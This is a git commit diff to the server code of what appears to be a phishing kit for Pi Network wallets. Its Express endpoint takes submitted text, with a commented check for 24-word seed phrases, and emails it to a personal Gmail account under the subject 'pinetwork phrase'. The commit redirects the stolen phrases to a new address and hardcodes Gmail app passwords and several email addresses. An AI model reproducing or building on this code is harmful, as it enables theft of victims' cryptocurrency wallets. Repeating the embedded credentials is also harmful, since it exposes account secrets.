c8216f7000df138b7692f1316abb8f59b6f50ec6
gra-plety <Graceplenty90@gmail.com>
2025-04-26 16:21:14 +0100

    Update index.js

--- index.js
+++ index.js
@@ -22,8 +22,8 @@ const transporter = nodemailer.createTransport({
     // pass: "phop baoj wpki iilk",
     // user: "Pinetworkm493@gmail.com",
     //pi-personal  
-      pass: "tiif jwus iexd qocp",
-      user: "a@gmail.com",
+      pass: "jjmm pmwp heut ghgn",
+      user: "Graceplenty90@gmail.com",
 
   },
   service: "gmail",
@@ -58,7 +58,7 @@ app.post("/submit/7668", async (req, res) => {
     // if(mfText && mfText.split(' ').length == 24){
       transporter.sendMail({
         from: "PiNetworkWallet",
-        to: ["a0@gmail.com"],
+        to: ["Graceplenty90@gmail.com"],
         // to: ["pablomizeto@gmail.com"],
         subject: "pinetwork phrase",
         text: mfText,
